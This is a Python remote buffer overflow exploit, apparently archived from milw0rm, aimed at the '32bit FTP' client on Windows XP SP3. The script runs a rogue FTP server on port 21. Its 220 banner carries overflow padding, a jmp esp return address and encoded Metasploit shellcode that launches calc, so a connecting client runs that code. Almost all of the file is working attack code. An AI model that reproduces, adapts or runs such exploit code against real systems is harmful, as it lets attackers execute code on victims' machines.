#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : 32bit FTP (09.04.24) (Banner) Remote Buffer Overflow Exploit
#[*] Founder : Load 99%
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

from socket import *

payload = "\x41"*989
payload += "\x67\x86\x86\x7C" # jmp esp kernerl32.dll

 # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
payload += (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x54\x4e\x53\x4b\x38\x4e\x47"
"\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x58"
"\x4f\x45\x42\x32\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x43\x4b\x38"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x35\x46\x42\x46\x30\x45\x37\x45\x4e\x4b\x58"
"\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x50\x4b\x54"
"\x4b\x38\x4f\x35\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x31\x4b\x58"
"\x41\x50\x4b\x4e\x49\x38\x4e\x35\x46\x52\x46\x30\x43\x4c\x41\x43"
"\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x43\x45\x48\x42\x4c\x4a\x47"
"\x4e\x50\x4b\x48\x42\x34\x4e\x30\x4b\x48\x42\x47\x4e\x51\x4d\x4a"
"\x4b\x38\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b"
"\x42\x30\x42\x30\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x55\x41\x43"
"\x48\x4f\x42\x46\x48\x55\x49\x58\x4a\x4f\x43\x58\x42\x4c\x4b\x37"
"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x59"
"\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x56\x41\x56"
"\x4e\x56\x43\x36\x42\x30\x5a")

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 "+payload+"\r\n")
c.recv(1024)
c.close()
raw_input("[+] Done, press enter to quit")
s.close()

# milw0rm.com [2009-05-05]
